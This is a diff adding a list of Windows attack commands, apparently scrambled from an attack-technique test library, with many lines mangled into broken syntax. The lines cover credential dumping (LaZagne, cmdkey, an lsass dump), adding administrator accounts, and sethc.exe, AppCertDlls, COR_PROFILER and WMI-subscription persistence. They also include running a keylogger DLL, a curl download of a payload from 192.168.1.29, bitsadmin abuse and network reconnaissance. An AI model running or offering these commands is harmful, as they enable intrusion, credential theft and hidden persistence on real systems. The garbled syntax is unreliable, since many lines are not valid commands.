@@ -1,0 +1,64 @@
+get-localgroupmember -group users ''
+upx - $ { file_path }
+set windir= $ { $ { new_time }
+runexehelper.exe $ { command }
+net localgroup administrators $ { user_name }
+$ shortcut.workingdirectory = `` cor_enable_profiling '' default -class appinit_dlls ''
+lazagne.exe windows
+sc.exe create $ { mask }
+invoke-screencap $ { compression_level } -o $ { user_name }
+lazagne.exe windows -mscache
+cmdkey /list
+ipconfig
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /addfile $ { bits_job_name } $ { file_name }
+netsh ueraccount get where targetinstance onlogon win32_desktop
+net user administrator /domain
+get-childitem -filter `` '' '' add-localgroupmember '' /v `` cor_profiler '' -class ' ) .starttype test '' `` $ { binary } ''
+nmap -- -o .\putty.exe
+fltmc.exe unload $ { bits_job_name }
+cmdkey /list
+bitsadmin.exe /create $ { destination_file }
+net user administrator /domain
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' \windows\system32\sethc.exe full
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` cor_profiler_path '' '' '' /d `` c : \windows\system32\sethc.exe .starttype team '' ' '' , `` $ { binary_file_path } , `` $ { \user reg.exe : # { timeout } -f $ { domain }
+lazagne.exe windows unload
+query user /server : # { anything }
+rundll32 keylogger_dll.dll , keylog
+wmic process list | findstr `` $ : disable
+for ( explorer.exe c : \windows\temp\lsass_dump.dmp
+icacls c : \windows\system32\sethc.exe /grant administrators : keylog
+net user administrator /domain
+python -c `` import .\redirect.sdb
+bitsadmin.exe /setnotifycmdline $ { bits_job_name } c : $ { ip } }
+icacls c : \users\
+net stop spooler
+theharvester -d $ : domain
+query user /server : # { computer_name }
+gpresult /z
+`` [ net.servicepointmanager ] : :createprocessfromparent [ ] : :securityprotocol = [ net.securityprotocoltype ] : :tls12
+reg add `` lsadbextpt '' `` domain c : \windows\system32 '' '' $ true
+net user administrator /domain : /add
+cmdkey /list
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d 1 /f
+$ consumer=set-wmiinstance -namespace `` '' `` userinit /d 512
+net localgroup administrators /domain
+net user = `` $ { ip }
+$ shortcut = ) -class -startaddress $ { command }
+net stop
+net user `` $ shortcutlocation )
+psr.exe /start /output and encoded setup\installed appdata % \system32\osk.exe /grant administrators : $ { shadow copy volumn name set full
+get-wmiobject win32_group
+gobuster dir -u '' $ { binary } in $ { krbtgt_ntlm } -u $ _.lastwritetime
+lazagne.exe windows
+namp -sn $ { user_name } /add
+rundll32 popcalc.dll +h
+ipconfig
+net localgroup administrators `` $ { output_zip_name } '' `` $ { pid } /o
+lazagne.exe windows
+reg add `` lsadbextpt '' `` $ '' t1547.009 . = `` c : /v % windir for i ; invoke-portscan menu\programs\startup\t1547.009.lnk : $ { process } , -propertytype : '' , $ { command } ''
+lazagne.exe windows
+rundll32 popcalc.dll , popcalc
+wt.exe $ { command }
+adfind.exe -f ( objectcategory=computer )
+$ filter=set-wmiinstance -class __eventfilter -namespace `` '' root\subscription '' -class tracking '' \windows\system32\sethc_backup.exe
